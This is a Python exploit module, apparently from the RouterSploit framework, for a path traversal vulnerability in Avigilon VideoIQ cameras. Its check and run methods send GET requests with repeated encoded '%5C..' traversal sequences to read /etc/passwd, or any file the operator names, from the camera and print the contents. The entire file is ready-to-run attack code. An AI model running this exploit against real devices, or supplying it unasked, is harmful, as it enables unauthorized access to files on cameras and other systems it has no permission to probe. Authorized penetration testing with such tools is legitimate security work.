from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Avigilon VideoIQ Camera Path Traversal",
        "description": "Module exploits Avigilon VideoIQ Camera Path Traversal vulnerability. If target is vulnerable "
                       "it is possible to read file from file system.",
        "authors": (
            "Yakir Wizman",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40284/",
        ),
        "devices": (
            "VideoIQ Camera",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(8080, "Target HTTP port")

    filename = OptString("/etc/passwd", "File to read from filesystem")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            path = "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C..{}".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path
            )

            if response is None:
                print_error("Exploit failed - could not read response")
                return

            print_status("Trying to read file: {}".format(self.filename))
            if any(err in response.text for err in ["Error 404 NOT_FOUND", "Problem accessing", "HTTP ERROR 404"]):
                print_status("File does not exist: {}".format(self.filename))
                return

            if response.text:
                print_info(response.text)
            else:
                print_status("File seems to be empty")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")

    @mute
    def check(self):
        path = "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"

        response = self.http_request(
            method="GET",
            path=path
        )

        if response and utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target is vulnerable

        return False  # target is not vulnerable
